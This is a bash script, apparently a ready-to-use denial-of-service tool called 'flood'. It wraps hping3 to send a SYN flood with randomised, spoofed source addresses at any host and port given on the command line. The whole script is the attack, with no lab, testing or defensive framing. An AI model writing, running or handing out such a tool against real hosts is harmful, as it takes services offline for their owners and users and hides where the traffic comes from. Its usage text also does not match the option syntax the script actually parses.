#!/bin/bash


# Show usage via commandline arguments
usage() {
  echo "Usage: ./flood [-p port] [-s packet size] [-c packet count] [-w window size] host"
  echo "  options:"
  echo "    -p --port               port         [default: 443] "
  echo "    -s --size               packet size  [default: 120] "
  echo "    -c --count packet       count        [default: 20000]"
  echo "    -w --window_size        window size  [default: 64]"
  echo "    -h --host               host"
  echo ""
  exit
}


if [ $# -eq 0 ]
  then
    usage
fi


PORT=443
SIZE=120
PACKETS=20000
WINSIZE=64

for i in "$@"
do
case $i in
    -w=*|--window_size=*)
    WINSIZE="${i#*=}"
    shift # past argument=value
    ;;
    -p=*|--port=*)
    PORT="${i#*=}"
    shift # past argument=value
    ;;
    -s=*|--size=*)
    SIZE="${i#*=}"
    shift # past argument=value
    ;;
    -c=*|--count=*)
    PACKETS="${i#*=}"
    shift # past argument=value
    ;;
    -h=*|--host=*)
    HOST="${i#*=}"
    shift # past argument=value
    ;;
    --help)
    usage
    shift # past argument with no value
    ;;
    *)
          # unknown option
    ;;
esac
done



hping3 -c $PACKETS -d $SIZE -S -w $WINSIZE -p $PORT --flood --rand-source $HOST


